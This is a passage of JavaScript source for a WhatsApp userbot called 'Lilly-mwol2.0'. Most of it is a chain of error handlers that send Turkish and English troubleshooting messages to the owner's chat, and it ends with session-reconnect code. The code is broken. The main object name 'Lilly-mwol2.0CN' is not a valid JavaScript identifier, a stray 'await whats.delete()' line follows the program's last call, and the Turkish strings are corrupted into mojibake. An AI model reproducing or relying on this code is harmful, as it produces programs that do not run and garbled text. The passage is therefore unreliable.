                                        '\n*Nedeni:* _Grup adminlerinin kullanabildi臒i komutlar谋n ara s谋ra split fonksiyonunu g枚rememesi._ ' +
                                        '\n*脟枚z眉m眉:* _Restart atman谋z yeterli olacakt谋r._'
                                        , MessageType.text
                                    );                               
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Ookla Server Connection_' +
                                        '\n*Nedeni:* _Speedtest verilerinin sunucuya iletilememesi._' +
                                        '\n*脟枚z眉m眉:* _Bir kez daha kullan谋rsan谋z sorun 莽枚z眉lecektir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Requested Audio Params_' +
                                        '\n*Nedeni:* _TTS komutunun latin alfabesi d谋艧谋nda kullan谋lmas谋._' +
                                        '\n*脟枚z眉m眉:* _Komutu latin harfleri 莽er莽evesinde kullan谋rsan谋z sorun 莽枚z眉lecektir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _No Such File or Directory_' +
                                        '\n*Nedeni:* _Pluginin yanl谋艧 kodlanmas谋._' +
                                        '\n*脟枚z眉m眉:* _L眉tfen plugininin kodlar谋n谋 kontrol edin._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Error 404 HTTPS_' +
                                        '\n*Nedeni:* _Heroku plugini alt谋ndaki komutlar谋n kullan谋lmas谋 sonucu sunucu ile ileti艧ime ge莽ilememesi._' +
                                        '\n*脟枚z眉m眉:* _Biraz bekleyip tekrar deneyin. Hala hata al谋yorsan谋z internet sitesi 眉zerinden i艧lemi ger莽ekle艧tirin._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
                                        '\n*Nedeni:* _IMG yada Wiki komutlar谋n谋n kullan谋lmas谋._' +
                                        '\n*脟枚z眉m眉:* _Bu hatan谋n 莽枚z眉m眉 yoktur. 脰nemli bir hata de臒ildir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
                                        '\n*Nedeni:* _IMG yada Wiki komutlar谋n谋n kullan谋lmas谋._' +
                                        '\n*脟枚z眉m眉:* _Bu hatan谋n 莽枚z眉m眉 yoktur. 脰nemli bir hata de臒ildir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Bailyes Action Error_ ' +
                                        '\n*Nedeni:* _Tam nedeni bilinmiyor. Birden fazla se莽enek bu hatay谋 tetiklemi艧 olabilir._' +
                                        '\n*脟枚z眉m眉:* _Bir kez daha kullan谋rsan谋z d眉zelebilir. Hata devam ediyorsa restart atmay谋 deneyebilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Cannot Decode Text or Media_' +
                                        '\n*Nedeni:* _Pluginin yanl谋艧 kullan谋m谋._' +
                                        '\n*脟枚z眉m眉:* _L眉tfen komutlar谋 plugin a莽谋klamas谋nda yazd谋臒谋 gibi kullan谋n._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Word Character Usage_' +
                                        '\n*Nedeni:* _TTP, ATTP gibi komutlar谋n latin alfabesi d谋艧谋nda kullan谋lmas谋._' +
                                        '\n*脟枚z眉m眉:* _Komutu latif alfabesi 莽er莽evesinde kullan谋rsan谋z sorun 莽枚z眉lecektir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Deleting Plugin_' +
                                        '\n*Nedeni:* _Silinmek istenen plugin isminin yanl谋艧 girilmesi._' +
                                        '\n*脟枚z眉m眉:* _L眉tfen silmek istedi臒iniz pluginin ba艧谋na_ *__* _koymadan deneyin. Hala hata al谋yorsan谋z ismin sonundaki_ ```?(.*) / $``` _gibi ifadeleri eksiksiz girin._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*馃檱馃徎 Maalesef Bu Hatay谋 Okuyamad谋m! 馃檱馃徎*' +
                                        '\n_Daha fazla yard谋m i莽in grubumuza yazabilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                            }
                            else {
                               
                                if (error.message.includes('URL')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 ERROR ANALYSIS [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Only Absolutely URLs Supported_' +
                                        '\n*Reason:* _The usage of media tools (xmedia, sticker..) in the LOG number._' +
                                        '\n*Solution:* _You can use commands in any chat, except the LOG number._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 ERROR ANALYSIS [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Deleting Plugin_' +
                                        '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
                                        '\n*Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 ERROR ANALYSIS [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Split of Undefined_' +
                                        '\n*Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
                                        '\n*Solution:* _Restarting will be enough._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 ERROR ANALYSIS [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _SQL Database Error_' +
                                        '\n*Reason:* _Database corruption._ ' +
                                        '\n*Solution:* _There is no known solution. You can try reinstalling it._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 ERROR ANALYSIS [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Ookla Server Connection_' +
                                        '\n*Reason:* _Speedtest data cannot be transmitted to the server._' +
                                        '\n*Solution:* _If you use it one more time the problem will be solved._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 ERROR ANALYSIS [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Requested Audio Params_' +
                                        '\n*Reason:* _Using the TTS command outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin letters frame._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 ERROR ANALYSIS [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved``` ==========' +
                                        '\n\n*Main Error:* _No Such File or Directory_' +
                                        '\n*Reason:* _Incorrect coding of the plugin._' +
                                        '\n*Solution:* _Please check the your plugin codes._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 ERROR ANALYSIS [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Error 404 HTTPS_' +
                                        '\n*Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
                                        '\n*Solution:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 ERROR ANALYSIS [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 ERROR ANALYSIS [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 ERROR ANALYSIS [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Bailyes Action Error_ ' +
                                        '\n*Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
                                        '\n*Solution:* _If you use it again, it may improve. If the error continues, you can try to restart._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 ERROR ANALYSIS [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Cannot Decode Text or Media_' +
                                        '\n*Reason:* _Incorrect use of the plug._' +
                                        '\n*Solution:* _Please use the commands as written in the plugin description._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 ERROR ANALYSIS [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Word Character Usage_' +
                                        '\n*Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin alphabet.._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*馃檱馃徎 Sorry, I Couldnt Read This Error! 馃檱馃徎*' +
                                        '\n_You can write to our support group for more help._'
                                        , MessageType.text
                                    );
                                }    
                            }
                        }
                    }
                }
            }
        )
    });
    // ==================== End Error Message ====================

    try {
        await Lilly-mwol2.0CN.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Loading Old Version Session...'))
            Lilly-mwol2.0CN.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await Lilly-mwol2.0CN.connect();
            } catch {
                return;
            }
        }
    }
}

Lilly-mwol2.0();

                          await whats.delete()
